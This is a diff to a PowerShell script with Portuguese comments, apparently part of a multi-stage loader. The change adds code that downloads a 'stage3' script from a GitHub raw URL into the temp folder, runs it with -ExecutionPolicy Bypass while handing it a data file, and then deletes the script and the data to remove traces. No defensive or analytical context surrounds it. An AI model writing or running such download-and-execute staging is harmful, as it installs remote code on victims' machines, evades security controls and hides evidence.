@@ -67,7 +67,20 @@ try {
     # Limpa arquivo original
     Remove-Item $inputPath -Force -ErrorAction SilentlyContinue
     
-    Write-Output $outputPath
+    # Baixa e executa Stage 3
+    $stage3Url = "https://raw.githubusercontent.com/luizesim99-alt/lumen/refs/heads/main/stage3_execute.ps1"
+    $tempStage3 = "$env:TEMP\s3.ps1"
+    
+    $wc = New-Object Net.WebClient
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    $stage3Code = $wc.DownloadString($stage3Url)
+    [IO.File]::WriteAllText($tempStage3, $stage3Code)
+    
+    & powershell -NoP -ExecutionPolicy Bypass -File $tempStage3 -dataPath $outputPath
+    
+    # Cleanup
+    Remove-Item $tempStage3 -Force -ErrorAction SilentlyContinue
+    Remove-Item $outputPath -Force -ErrorAction SilentlyContinue
     
 } catch {
     exit 1
